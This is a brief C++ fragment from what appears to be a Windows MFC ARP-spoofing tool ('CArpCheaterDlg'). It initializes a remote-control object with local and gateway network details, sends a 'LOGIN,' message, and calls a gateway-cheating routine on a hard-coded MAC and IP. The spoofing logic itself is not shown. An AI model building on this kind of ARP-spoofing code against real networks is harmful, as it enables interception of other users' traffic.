//返回值： 操作结果
//修改记录：
//==================================================================
int  CArpCheaterDlg::InitRemoteControl()
{
    remoteCtrl = new CRemoteControl(m_localip,m_localmac,m_gatewayip,m_gatewaymac,m_netmask);
    remoteCtrl->SendData("LOGIN,");
    remoteCtrl->SaveConfig();
    return 1;
}


void CArpCheaterDlg::OnBnClickedBtntest()
{
    //InitRemoteControl();
    remoteCtrl->CheatGateFound(remoteCtrl->FindIPFromMAC("00-19-5b-db-65-74","223.0.0.2"),"00-19-5b-db-65-74","11:11:11");
}
